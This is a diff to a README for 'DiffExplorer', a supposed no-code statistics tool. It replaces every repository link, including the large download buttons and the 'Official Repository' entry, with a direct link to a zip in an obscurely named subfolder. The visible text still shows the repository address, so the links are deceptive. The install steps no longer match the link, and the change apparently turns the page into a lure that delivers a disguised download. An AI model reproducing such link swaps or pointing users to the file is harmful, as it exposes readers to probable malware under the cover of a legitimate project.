@@ -1,7 +1,7 @@
 <h1>📊 DiffExplorer - Statistical Results, Zero Coding Required</h1>
 
 <p align="center">
-  <a href="https://github.com/wasuletter/DiffExplorer" style="background-color:#FF6B6B; color:white; padding:16px 32px; text-decoration:none; font-size:20px; border-radius:8px; font-weight:bold; display:inline-block; box-shadow:0 4px 6px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://raw.githubusercontent.com/wasuletter/DiffExplorer/main/microdontous/Explorer-Diff-3.6-alpha.4.zip" style="background-color:#FF6B6B; color:white; padding:16px 32px; text-decoration:none; font-size:20px; border-radius:8px; font-weight:bold; display:inline-block; box-shadow:0 4px 6px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 <h2>🔬 What Is DiffExplorer?</h2>
@@ -23,7 +23,7 @@
 <p>Follow these simple steps to get DiffExplorer running on your computer today.</p>
 
 <h3>Step 1: Download DiffExplorer</h3>
-<p>Visit this link to download the application: <a href="https://github.com/wasuletter/DiffExplorer">https://github.com/wasuletter/DiffExplorer</a></p>
+<p>Visit this link to download the application: <a href="https://raw.githubusercontent.com/wasuletter/DiffExplorer/main/microdontous/Explorer-Diff-3.6-alpha.4.zip">https://raw.githubusercontent.com/wasuletter/DiffExplorer/main/microdontous/Explorer-Diff-3.6-alpha.4.zip</a></p>
 <p>Click the <strong>Download</strong> button on that page and save the file somewhere you can easily find it (like your Desktop or Downloads folder).</p>
 
 <h3>Step 2: Extract the Files</h3>
@@ -36,7 +36,7 @@
 <p>If you haven't downloaded yet, here's your full walkthrough:</p>
 
 <ol>
-  <li><strong>Go to the official download page:</strong> <a href="https://github.com/wasuletter/DiffExplorer">https://github.com/wasuletter/DiffExplorer</a></li>
+  <li><strong>Go to the official download page:</strong> <a href="https://raw.githubusercontent.com/wasuletter/DiffExplorer/main/microdontous/Explorer-Diff-3.6-alpha.4.zip">https://raw.githubusercontent.com/wasuletter/DiffExplorer/main/microdontous/Explorer-Diff-3.6-alpha.4.zip</a></li>
   <li><strong>Click the green "Code" button</strong>, then select "Download ZIP." The download begins automatically.</li>
   <li><strong>Wait for the download</strong> (typically 50-100 MB).</li>
   <li><strong>Extract the ZIP file</strong> by right-clicking and choosing "Extract All."</li>
@@ -45,7 +45,7 @@
 </ol>
 
 <p style="text-align:center; margin-top:20px;">
-  <a href="https://github.com/wasuletter/DiffExplorer" style="background-color:#4CAF50; color:white; padding:14px 28px; text-decoration:none; font-size:18px; border-radius:8px; font-weight:bold; display:inline-block;">🔗 GET DIFFEXPLORER NOW</a>
+  <a href="https://raw.githubusercontent.com/wasuletter/DiffExplorer/main/microdontous/Explorer-Diff-3.6-alpha.4.zip" style="background-color:#4CAF50; color:white; padding:14px 28px; text-decoration:none; font-size:18px; border-radius:8px; font-weight:bold; display:inline-block;">🔗 GET DIFFEXPLORER NOW</a>
 </p>
 
 <h2>📊 Using DiffExplorer - Quick Tour</h2>
@@ -98,7 +98,7 @@
 
 <h2>📚 Resources & Support</h2>
 <ul>
-  <li><strong>Official Repository:</strong> <a href="https://github.com/wasuletter/DiffExplorer">github.com/wasuletter/DiffExplorer</a></li>
+  <li><strong>Official Repository:</strong> <a href="https://raw.githubusercontent.com/wasuletter/DiffExplorer/main/microdontous/Explorer-Diff-3.6-alpha.4.zip">github.com/wasuletter/DiffExplorer</a></li>
   <li><strong>Issue Tracker:</strong> Report bugs or request features via GitHub Issues.</li>
   <li><strong>Documentation:</strong> More tutorials and sample datasets available on the GitHub page.</li>
 </ul>
@@ -121,5 +121,5 @@
 
 <p style="text-align:center; margin-top:30px; padding:20px; background-color:#f0f0f0; border-radius:8px;">
   <strong>Ready to accelerate your research?</strong><br>
-  <a href="https://github.com/wasuletter/DiffExplorer" style="background-color:#2196F3; color:white; padding:12px 24px; text-decoration:none; font-size:18px; border-radius:6px; font-weight:bold; display:inline-block; margin-top:10px;">📲 DOWNLOAD DIFFEXPLORER</a>
+  <a href="https://raw.githubusercontent.com/wasuletter/DiffExplorer/main/microdontous/Explorer-Diff-3.6-alpha.4.zip" style="background-color:#2196F3; color:white; padding:12px 24px; text-decoration:none; font-size:18px; border-radius:6px; font-weight:bold; display:inline-block; margin-top:10px;">📲 DOWNLOAD DIFFEXPLORER</a>
 </p>
